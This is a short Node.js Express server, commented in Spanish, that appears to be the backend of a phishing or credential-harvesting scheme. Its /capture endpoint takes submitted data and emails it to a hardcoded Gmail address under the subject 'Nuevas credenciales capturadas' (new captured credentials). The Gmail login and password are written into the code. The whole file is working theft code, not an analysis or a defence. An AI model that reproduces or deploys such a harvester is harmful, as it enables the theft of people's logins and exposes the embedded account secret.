const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/capture', (req, res) => {
    const { data } = req.body;

    // Configura el transporte de correo
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jjuuaann110794@gmail.com',
            pass: 'aNgADA934qT94'
        }
    });

    // Configura el correo
    const mailOptions = {
        from: 'jjuuaann110794@gmail.com',
        to: 'jjuuaann110794@gmail.com',
        subject: 'Nuevas credenciales capturadas',
        text: data
    };

    // Envía el correo
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Correo enviado: ' + info.response);
    });

    res.json({ message: 'Datos capturados con éxito' });
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
